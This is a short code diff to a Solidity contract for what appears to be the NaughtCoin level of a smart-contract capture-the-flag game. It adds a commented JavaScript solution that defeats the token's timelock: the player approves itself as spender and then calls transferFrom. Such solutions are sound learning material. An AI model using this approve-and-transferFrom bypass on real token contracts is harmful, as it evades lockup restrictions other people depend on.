@@ -35,6 +35,21 @@ contract NaughtCoin is ERC20 {
     }
 }
 
+/* Simple way to clear the level
+// Get balance
+const amount = await contract.balanceOf(player);
+
+// Approve yourself (player as spender)
+await contract.approve(player, amount);
+
+// Confirm allowance
+(await contract.allowance(player, player)).toString(); // Should show full balance
+
+// Exploit: transfer tokens away
+await contract.transferFrom(player, contract.address, amount);
+
+*/
+
 interface INaughtCoin {
     function transferFrom(address from, address to, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
